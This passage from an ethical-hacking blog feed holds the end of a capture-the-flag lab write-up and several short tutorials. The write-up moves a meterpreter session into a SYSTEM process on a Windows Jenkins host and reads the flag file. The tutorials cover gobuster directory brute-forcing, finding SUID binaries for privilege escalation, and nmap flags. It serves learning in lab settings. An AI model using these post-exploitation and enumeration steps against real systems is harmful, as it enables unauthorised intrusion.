 <span style="color:#ae81ff">1652</span>  <span style="color:#ae81ff">668</span>   jenkins.exe           x64   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\j</span>enkins.exe
 <span style="color:#ae81ff">1744</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1820</span>  <span style="color:#ae81ff">1652</span>  java.exe              x86   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\j</span>re<span style="color:#ae81ff">\b</span>in<span style="color:#ae81ff">\j</span>ava.exe
 <span style="color:#ae81ff">1860</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1912</span>  <span style="color:#ae81ff">524</span>   conhost.exe           x64   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onhost.exe
 <span style="color:#ae81ff">2160</span>  <span style="color:#ae81ff">1820</span>  cmd.exe               x86   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ysWOW64<span style="color:#ae81ff">\c</span>md.exe
 <span style="color:#ae81ff">2184</span>  <span style="color:#ae81ff">668</span>   SearchIndexer.exe     x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\S</span>earchIndexer.exe
 <span style="color:#ae81ff">2244</span>  <span style="color:#ae81ff">668</span>   taskhost.exe          x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\t</span>askhost.exe
 <span style="color:#ae81ff">2664</span>  <span style="color:#ae81ff">1612</span>  payload.exe           x86   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\w</span>orkspace<span style="color:#ae81ff">\p</span>roject<span style="color:#ae81ff">\p</span>ayload.exe
 <span style="color:#ae81ff">2972</span>  <span style="color:#ae81ff">668</span>   sppsvc.exe            x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>ppsvc.exe
 <span style="color:#ae81ff">3008</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe

</code></pre></div><p>The room itself recommends us to use <strong>services.exe</strong> process:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ae81ff">668</span>   <span style="color:#ae81ff">580</span>   services.exe          x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>ervices.exe

</code></pre></div><p>The first numeric value corresponds to the <strong>PID</strong> process ID. So let&rsquo;s migrate!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; migrate <span style="color:#ae81ff">668</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migrating from <span style="color:#ae81ff">2664</span> to 668...
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migration completed successfully.
meterpreter &gt; 
</code></pre></div><p>Yay! we did it, we migrated to a privileged process successfully.</p>
<p>Let&rsquo;s see what is the last question or objective of this room</p>
<blockquote>
<p>Question #5: <strong>read the root.txt file at C:\Windows\System32\config</strong></p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; shell
Process <span style="color:#ae81ff">2728</span> created.
Channel <span style="color:#ae81ff">1</span> created.
Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span>
Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.

C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;cd config
cd config

C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onfig&gt;type root.txt
type root.txt
<span style="color:#f92672">{</span>THIS IS THE FLAG VALUE<span style="color:#f92672">}</span>

C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onfig&gt;

</code></pre></div><p>And that&rsquo;s all there is to this room. I hope you find this useful, I tried to detail pretty much every step I took to solve the room. I&rsquo;m sure there are other ways to go about solving this room, I tried to operate within my noob-level expertise and I think the end result could prove useful to other noob-level ethical hackers out there.</p>
<p>As usual, happy hacking.</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<div class="container" style="margin:10px !important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <br> 
</div>
]]></content>
        </item>
        
        <item>
            <title>Gobuster_basics.sh</title>
            <link>https://tzero86-bits.netlify.app/posts/gobuster/</link>
            <pubDate>Sat, 15 Aug 2020 21:25:53 -0400</pubDate>
            
            <guid>https://tzero86-bits.netlify.app/posts/gobuster/</guid>
            <description>#GoBuster Basic usage# GoBuster brute-force tool for URIs (directories and files), DNS subdomains and virtual host names.
 Get GoBuster: If you need to download this tool to your system, visit this link  To start with the basic usage for this tool, let&amp;rsquo;s review some of the flags we can specify to run gobuster.
 .table { width: 100%; margin-bottom: 1rem; color: #212529 } .table td, .table th { padding: .</description>
            <content type="html"><![CDATA[<h2 id="gobuster-basic-usage">#GoBuster Basic usage#</h2>
<p>GoBuster brute-force tool for URIs (directories and files), DNS subdomains and virtual host names.</p>
<ul>
<li><strong>Get GoBuster</strong>: If you need to download this tool to your system, <a href="https://github.com/OJ/gobuster">visit this link</a></li>
</ul>
<p>To start with the basic usage for this tool, let&rsquo;s review some of the flags we can specify to run gobuster.</p>
<style>
    .table {
    width: 100%;
    margin-bottom: 1rem;
    color: #212529
}

.table td,
.table th {
    padding: .75rem;
    vertical-align: top;
    border-top: 1px solid #dee2e6
}

.table thead th {
    vertical-align: bottom;
    border-bottom: 2px solid #dee2e6
}

.table tbody+tbody {
    border-top: 2px solid #dee2e6
}

.table-sm td,
.table-sm th {
    padding: .3rem
}

.table-bordered {
    border: 1px solid #dee2e6
}

.table-bordered td,
.table-bordered th {
    border: 1px solid #dee2e6
}

.table-bordered thead td,
.table-bordered thead th {
    border-bottom-width: 2px
}

.table-borderless tbody+tbody,
.table-borderless td,
.table-borderless th,
.table-borderless thead th {
    border: 0
}

.table-striped tbody tr:nth-of-type(odd) {
    background-color: rgba(0, 0, 0, .05)
}

.table-hover tbody tr:hover {
    color: #212529;
    background-color: rgba(0, 0, 0, .075)
}

.table-primary,
.table-primary>td,
.table-primary>th {
    background-color: #b8daff
}

.table-primary tbody+tbody,
.table-primary td,
.table-primary th,
.table-primary thead th {
    border-color: #7abaff
}

.table-hover .table-primary:hover {
    background-color: #9fcdff
}

.table-hover .table-primary:hover>td,
.table-hover .table-primary:hover>th {
    background-color: #9fcdff
}

.table-secondary,
.table-secondary>td,
.table-secondary>th {
    background-color: #d6d8db
}

.table-secondary tbody+tbody,
.table-secondary td,
.table-secondary th,
.table-secondary thead th {
    border-color: #b3b7bb
}

.table-hover .table-secondary:hover {
    background-color: #c8cbcf
}

.table-hover .table-secondary:hover>td,
.table-hover .table-secondary:hover>th {
    background-color: #c8cbcf
}

.table-success,
.table-success>td,
.table-success>th {
    background-color: #c3e6cb
}

.table-success tbody+tbody,
.table-success td,
.table-success th,
.table-success thead th {
    border-color: #8fd19e
}

.table-hover .table-success:hover {
    background-color: #b1dfbb
}

.table-hover .table-success:hover>td,
.table-hover .table-success:hover>th {
    background-color: #b1dfbb
}

.table-info,
.table-info>td,
.table-info>th {
    background-color: #bee5eb
}

.table-info tbody+tbody,
.table-info td,
.table-info th,
.table-info thead th {
    border-color: #86cfda
}

.table-hover .table-info:hover {
    background-color: #abdde5
}

.table-hover .table-info:hover>td,
.table-hover .table-info:hover>th {
    background-color: #abdde5
}

.table-warning,
.table-warning>td,
.table-warning>th {
    background-color: #ffeeba
}

.table-warning tbody+tbody,
.table-warning td,
.table-warning th,
.table-warning thead th {
    border-color: #ffdf7e
}

.table-hover .table-warning:hover {
    background-color: #ffe8a1
}

.table-hover .table-warning:hover>td,
.table-hover .table-warning:hover>th {
    background-color: #ffe8a1
}

.table-danger,
.table-danger>td,
.table-danger>th {
    background-color: #f5c6cb
}

.table-danger tbody+tbody,
.table-danger td,
.table-danger th,
.table-danger thead th {
    border-color: #ed969e
}

.table-hover .table-danger:hover {
    background-color: #f1b0b7
}

.table-hover .table-danger:hover>td,
.table-hover .table-danger:hover>th {
    background-color: #f1b0b7
}

.table-light,
.table-light>td,
.table-light>th {
    background-color: #fdfdfe
}

.table-light tbody+tbody,
.table-light td,
.table-light th,
.table-light thead th {
    border-color: #fbfcfc
}

.table-hover .table-light:hover {
    background-color: #ececf6
}

.table-hover .table-light:hover>td,
.table-hover .table-light:hover>th {
    background-color: #ececf6
}

.table-dark,
.table-dark>td,
.table-dark>th {
    background-color: #c6c8ca
}

.table-dark tbody+tbody,
.table-dark td,
.table-dark th,
.table-dark thead th {
    border-color: #95999c
}

.table-hover .table-dark:hover {
    background-color: #b9bbbe
}

.table-hover .table-dark:hover>td,
.table-hover .table-dark:hover>th {
    background-color: #b9bbbe
}

.table-active,
.table-active>td,
.table-active>th {
    background-color: rgba(0, 0, 0, .075)
}

.table-hover .table-active:hover {
    background-color: rgba(0, 0, 0, .075)
}

.table-hover .table-active:hover>td,
.table-hover .table-active:hover>th {
    background-color: rgba(0, 0, 0, .075)
}

.table .thead-dark th {
    color: #fff;
    background-color: #343a40;
    border-color: #454d55
}

.table .thead-light th {
    color: #495057;
    background-color: #e9ecef;
    border-color: #dee2e6
}

.table-dark {
    color: #fff;
    background-color: #343a40
}

.table-dark td,
.table-dark th,
.table-dark thead th {
    border-color: #454d55
}

.table-dark.table-bordered {
    border: 0
}

.table-dark.table-striped tbody tr:nth-of-type(odd) {
    background-color: rgba(255, 255, 255, .05)
}

.table-dark.table-hover tbody tr:hover {
    color: #fff;
    background-color: rgba(255, 255, 255, .075)
}

@media (max-width:575.98px) {
    .table-responsive-sm {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch
    }
    .table-responsive-sm>.table-bordered {
        border: 0
    }
}

@media (max-width:767.98px) {
    .table-responsive-md {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch
    }
    .table-responsive-md>.table-bordered {
        border: 0
    }
}

@media (max-width:991.98px) {
    .table-responsive-lg {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch
    }
    .table-responsive-lg>.table-bordered {
        border: 0
    }
}

@media (max-width:1199.98px) {
    .table-responsive-xl {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch
    }
    .table-responsive-xl>.table-bordered {
        border: 0
    }
}

.table-responsive {
    display: block;
    width: 100%;
    overflow-x: auto;
    -webkit-overflow-scrolling: touch
}

.table-responsive>.table-bordered {
    border: 0
}

.table-center {
   margin: auto;
   width: 100% !important; 
}
</style>

<span class="table table-center table-dark table-striped table-bordered table-hover">
    <div class="table-center">
        <table>
<thead>
<tr>
<th align="center">GoBuster flag</th>
<th align="center">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td align="center"><strong>-e</strong></td>
<td align="center">Print the full URLs in your console</td>
</tr>
<tr>
<td align="center"><strong>-u</strong></td>
<td align="center">The target URL</td>
</tr>
<tr>
<td align="center"><strong>-w</strong></td>
<td align="center">Path to your wordlist</td>
</tr>
<tr>
<td align="center"><strong>-U</strong> and -P</td>
<td align="center">Username and Password for Basic Auth</td>
</tr>
<tr>
<td align="center"><strong>-p {proxy}</strong></td>
<td align="center">Proxy to use for requests</td>
</tr>
<tr>
<td align="center"><strong>-c {http cookies}</strong></td>
<td align="center">Specify a cookie for simulating your auth</td>
</tr>
</tbody>
</table>

    </div>
</span>
<p>GoBuster requires us to provide a wordlist in order to brute force our way through. If you are using Kali linux you most likely already have several wordlists available in the <em><strong>/usr/share/wordlists/dirbuster/</strong></em>. If you are not, you&rsquo;ll be lucky just by googling for some.</p>
<p>Now assuming we already have a worlist available, we can start our basic brute-force attack:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"> gobuster dir -u http://<span style="color:#f92672">{</span>target_IP<span style="color:#f92672">}</span>:<span style="color:#f92672">{</span>target_port<span style="color:#f92672">}</span> -w <span style="color:#f92672">{</span>wordlist_Path<span style="color:#f92672">}</span>
</code></pre></div><p>it is worth noting you can specify a host url and not only IPs. With this in mind a basic full example would look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> gobuster dir -u http://127.0.0.1:80 -w /home/oj/wordlists/shortlist.txt
</code></pre></div><p>And it&rsquo;ll produce and output similar to this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Mode         : dir
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url/Domain   : https://127.0.0.1/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads      : <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist     : /home/oj/wordlists/shortlist.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes : 200,204,301,302,307,401,403
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent   : gobuster/3.0.1
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Verbose      : true
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout      : 10s
<span style="color:#f92672">===============================================================</span>
2019/06/21 11:50:51 Starting gobuster
<span style="color:#f92672">===============================================================</span>
Missed: /alsodoesnotexist <span style="color:#f92672">(</span>Status: 404<span style="color:#f92672">)</span>
Found: /index <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
Missed: /doesnotexist <span style="color:#f92672">(</span>Status: 404<span style="color:#f92672">)</span>
Found: /categories <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
Found: /posts <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
Found: /contact <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
2019/06/21 11:50:51 Finished
<span style="color:#f92672">===============================================================</span>
</code></pre></div><p>There you have it, a basic usage of GoBuster to fuzz some directories. If you want to explore additional flags to use some advanced features and fine tune your attack. Run gobuster with the <strong>-h</strong> flag.</p>
<p>Additionaly check out <a href="https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/">this post</a> from RedTeamTutorials to see some advanced options.</p>
<p>Happy hacking.</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<div class="container" style="margin:10px !important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <br> 
</div>
]]></content>
        </item>
        
        <item>
            <title>Get_SUID.sh</title>
            <link>https://tzero86-bits.netlify.app/posts/get_suid/</link>
            <pubDate>Sat, 15 Aug 2020 18:13:59 -0400</pubDate>
            
            <guid>https://tzero86-bits.netlify.app/posts/get_suid/</guid>
            <description>#How to locate SUID Files using Find command#  In Linux, SUID (set owner userId upon execution) is a special type of &amp;gt;file permission given to a file. SUID gives temporary permissions to a &amp;gt;user to run the program/file with the permission of the file owner (rather &amp;gt;than the user who runs it). {TryHackme}
 For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd).</description>
            <content type="html"><![CDATA[<h2 id="how-to-locate-suid-files-using-find-command">#How to locate SUID Files using Find command#</h2>
<blockquote>
<p>In Linux, <strong>SUID</strong> (set owner userId upon execution) is  a special type of &gt;file permission given to a file. <strong><em>SUID gives temporary  permissions to a &gt;user to run the program/file with the permission of  the file owner (rather &gt;than the user who runs it)</em></strong>. <strong><em>{TryHackme}</em></strong></p>
</blockquote>
<p>For example,  the binary file to change your password has the SUID bit set on it  <strong><em>(/usr/bin/passwd)</em></strong>. This is because to change your password, it will need  to write to the shadowers file that you do not have access to, root  does, so it has root privileges to make the right changes.</p>

    <img src="../img/suid.png"  alt="Hello Friend"  class="center"  style="border-radius: 1px; padding: 20px"  />


<p>Let&rsquo;s try to understand what SUID, SGID and the Stickly bits mean:</p>
<ul>
<li>
<p><strong>SUID bit</strong>:</p>
<ul>
<li>On Files: User executes the file with permissions of the owner.</li>
<li>On Directories: nothing.</li>
</ul>
</li>
<li>
<p><strong>SGID bit</strong>:</p>
<ul>
<li>On Files: User executes the file with permissions of the group owner.</li>
<li>On Directories: Files created in directory get same permissions as group owner.</li>
</ul>
</li>
<li>
<p><strong>Sticky bit</strong>:</p>
<ul>
<li>On Files: No use.</li>
<li>On Directories: Users are blocked from deleting files from other users.</li>
</ul>
</li>
</ul>
<p>SUID  bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all  sorts of issues.</p>
<p>To search the a system for these type of files, we can use the <strong>find</strong> command like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
</code></pre></div><p>This will find all files that current user <em><strong>-u=s</strong></em> has permissions <em><strong>-perm</strong></em> to access, making sure they are file type <em><strong>-type file</strong></em> and will not show any errors due to lack of access to any file <em><strong>2&gt;/dev/null</strong></em></p>
<p>Alternatively we can also do this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">find / -user root -perm /4000  2&gt;&amp;<span style="color:#ae81ff">1</span> | grep -v <span style="color:#e6db74">&#34;Permission denied&#34;</span>
</code></pre></div><ul>
<li><strong>find /</strong>: we start the search on the root directory.</li>
<li><strong>-user root</strong>: files owned by root user.</li>
<li><strong>-perm /4000</strong>: files with octal format equivalent for SUID.</li>
<li><strong>2&gt;&amp;1</strong>: redirect any standar error messages as a standar output.</li>
<li><strong>|</strong>: The pipe character takes the output of previous command as input of the next command.</li>
<li><strong>grep -v &ldquo;Permission denied&rdquo;</strong>: We use grep to filter out any result including access errors. <strong>-v</strong> means inverse, so it will skip any files with the permissions denied message in it.</li>
</ul>
<p>Happy hacking.</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<div class="container" style="margin:10px !important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <br> 
</div>
]]></content>
        </item>
        
        <item>
            <title>Nmap_basics.sh</title>
            <link>https://tzero86-bits.netlify.app/posts/nmap_basics/</link>
            <pubDate>Sat, 15 Aug 2020 16:56:33 -0400</pubDate>
            
            <guid>https://tzero86-bits.netlify.app/posts/nmap_basics/</guid>
            <description>#NMAP - Basic Usage#  nmap is an free, open-source and powerful tool used to discover hosts and services on a computer network. In our example, we are using nmap to scan this machine to identify all services that are running on a particular port. nmap has many capabilities, below &amp;gt; is a table summarizing some of the functionality it provides. {from TryHackme}
 Here are some of the basic switches/flags that your can use when running an nmap scan:</description>
            <content type="html"><![CDATA[<h2 id="nmap---basic-usage">#NMAP - Basic Usage#</h2>
<blockquote>
<p><strong>nmap</strong> is an free, open-source and powerful tool used to discover hosts and services on a computer network. In our example, we are
using nmap to scan this machine  to identify all services that are running on a particular port. nmap  has many capabilities, below &gt; is a table summarizing some of the functionality it provides.
<em>{from TryHackme}</em></p>
</blockquote>
<p>Here are some of the basic switches/flags that your can use when running an nmap scan:</p>
<style>
    .table {
    width: 100%;
    margin-bottom: 1rem;
    color: #212529
}

.table td,
.table th {
    padding: .75rem;
    vertical-align: top;
    border-top: 1px solid #dee2e6
}

.table thead th {
    vertical-align: bottom;
    border-bottom: 2px solid #dee2e6
}

.table tbody+tbody {
    border-top: 2px solid #dee2e6
}

.table-sm td,
.table-sm th {
    padding: .3rem
}

.table-bordered {
    border: 1px solid #dee2e6
}

.table-bordered td,
.table-bordered th {
    border: 1px solid #dee2e6
}

.table-bordered thead td,
.table-bordered thead th {
    border-bottom-width: 2px
}

.table-borderless tbody+tbody,
.table-borderless td,
.table-borderless th,
.table-borderless thead th {
    border: 0
}

.table-striped tbody tr:nth-of-type(odd) {
    background-color: rgba(0, 0, 0, .05)
}

.table-hover tbody tr:hover {
    color: #212529;
    background-color: rgba(0, 0, 0, .075)
}

.table-primary,
.table-primary>td,
.table-primary>th {
    background-color: #b8daff
}

.table-primary tbody+tbody,
.table-primary td,
.table-primary th,
.table-primary thead th {
    border-color: #7abaff
}

.table-hover .table-primary:hover {
    background-color: #9fcdff
}

.table-hover .table-primary:hover>td,
.table-hover .table-primary:hover>th {
    background-color: #9fcdff
}

.table-secondary,
.table-secondary>td,
.table-secondary>th {
    background-color: #d6d8db
}

.table-secondary tbody+tbody,
.table-secondary td,
.table-secondary th,
.table-secondary thead th {
    border-color: #b3b7bb
}

.table-hover .table-secondary:hover {
    background-color: #c8cbcf
}

.table-hover .table-secondary:hover>td,
.table-hover .table-secondary:hover>th {
    background-color: #c8cbcf
}

.table-success,
.table-success>td,
.table-success>th {
    background-color: #c3e6cb
}

.table-success tbody+tbody,
.table-success td,
.table-success th,
.table-success thead th {
    border-color: #8fd19e
}

.table-hover .table-success:hover {
    background-color: #b1dfbb
}

.table-hover .table-success:hover>td,
.table-hover .table-success:hover>th {
    background-color: #b1dfbb
}

.table-info,
.table-info>td,
.table-info>th {
    background-color: #bee5eb
}

.table-info tbody+tbody,
.table-info td,
.table-info th,
.table-info thead th {
    border-color: #86cfda
}

.table-hover .table-info:hover {
    background-color: #abdde5
}

.table-hover .table-info:hover>td,
.table-hover .table-info:hover>th {
    background-color: #abdde5
}

.table-warning,
.table-warning>td,
.table-warning>th {
    background-color: #ffeeba
}

.table-warning tbody+tbody,
.table-warning td,
.table-warning th,
.table-warning thead th {
    border-color: #ffdf7e
}

.table-hover .table-warning:hover {
    background-color: #ffe8a1
}

.table-hover .table-warning:hover>td,
.table-hover .table-warning:hover>th {
    background-color: #ffe8a1
}

.table-danger,
.table-danger>td,
.table-danger>th {
    background-color: #f5c6cb
}

.table-danger tbody+tbody,
.table-danger td,
.table-danger th,
.table-danger thead th {
    border-color: #ed969e
}

.table-hover .table-danger:hover {
    background-color: #f1b0b7
}

.table-hover .table-danger:hover>td,
.table-hover .table-danger:hover>th {
    background-color: #f1b0b7
}

.table-light,
.table-light>td,
.table-light>th {
    background-color: #fdfdfe
}

.table-light tbody+tbody,
.table-light td,
.table-light th,
.table-light thead th {
    border-color: #fbfcfc
}

.table-hover .table-light:hover {
    background-color: #ececf6
}

.table-hover .table-light:hover>td,
.table-hover .table-light:hover>th {
    background-color: #ececf6
}

.table-dark,
.table-dark>td,
.table-dark>th {
    background-color: #c6c8ca
}

.table-dark tbody+tbody,
.table-dark td,
.table-dark th,
.table-dark thead th {
    border-color: #95999c
}

.table-hover .table-dark:hover {
    background-color: #b9bbbe
}

.table-hover .table-dark:hover>td,
.table-hover .table-dark:hover>th {
    background-color: #b9bbbe
}

.table-active,
.table-active>td,
.table-active>th {
    background-color: rgba(0, 0, 0, .075)
}

.table-hover .table-active:hover {
    background-color: rgba(0, 0, 0, .075)
}

.table-hover .table-active:hover>td,
.table-hover .table-active:hover>th {
    background-color: rgba(0, 0, 0, .075)
}

.table .thead-dark th {
    color: #fff;
    background-color: #343a40;
    border-color: #454d55
}

.table .thead-light th {
    color: #495057;
    background-color: #e9ecef;
    border-color: #dee2e6
}

.table-dark {
    color: #fff;
    background-color: #343a40
}

.table-dark td,
.table-dark th,
.table-dark thead th {
    border-color: #454d55
}

.table-dark.table-bordered {
    border: 0
}

.table-dark.table-striped tbody tr:nth-of-type(odd) {
    background-color: rgba(255, 255, 255, .05)
}

.table-dark.table-hover tbody tr:hover {
    color: #fff;
    background-color: rgba(255, 255, 255, .075)
}

@media (max-width:575.98px) {
    .table-responsive-sm {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch
    }
    .table-responsive-sm>.table-bordered {
        border: 0
    }
}

@media (max-width:767.98px) {
    .table-responsive-md {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch
    }
    .table-responsive-md>.table-bordered {
        border: 0
    }
}

@media (max-width:991.98px) {
    .table-responsive-lg {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch
    }
    .table-responsive-lg>.table-bordered {
        border: 0
    }
}

@media (max-width:1199.98px) {
    .table-responsive-xl {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch
    }
    .table-responsive-xl>.table-bordered {
        border: 0
    }
}

.table-responsive {
    display: block;
    width: 100%;
    overflow-x: auto;
    -webkit-overflow-scrolling: touch
}

.table-responsive>.table-bordered {
    border: 0
}

.table-center {
   margin: auto;
   width: 100% !important; 
}
</style>

<span class="table table-center table-dark table-striped table-bordered table-hover">
    <div class="table-center">
        <table>
<thead>
<tr>
<th align="left">nmap flag</th>
<th align="center">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td align="left">-sV</td>
<td align="center"><em>Attempts to determine the version of the services running</em></td>
</tr>
<tr>
<td align="left">-p {port} or -p-</td>
<td align="center"><em>Port scan for port or scan all ports</em></td>
</tr>
<tr>
<td align="left">-Pn</td>
<td align="center"><em>Disable host discovery and just scan for open ports</em></td>
</tr>
<tr>
<td align="left">-A</td>
<td align="center"><em>OS and version detection, runs integrated scripts</em></td>
</tr>
<tr>
<td align="left">-sC</td>
<td align="center"><em>Scan with the default nmap scripts</em></td>
</tr>
<tr>
<td align="left">-v</td>
<td align="center"><em>Verbose mode</em></td>
</tr>
<tr>
<td align="left">-sU</td>
<td align="center"><em>UDP port scan</em></td>
</tr>
<tr>
<td align="left">-sS</td>
<td align="center"><em>TCP SYN port scan</em></td>
</tr>
</tbody>
</table>

    </div>
</span>
<h2 id="how-to-scan-nmap-ports">#How to Scan Nmap Ports#</h2>
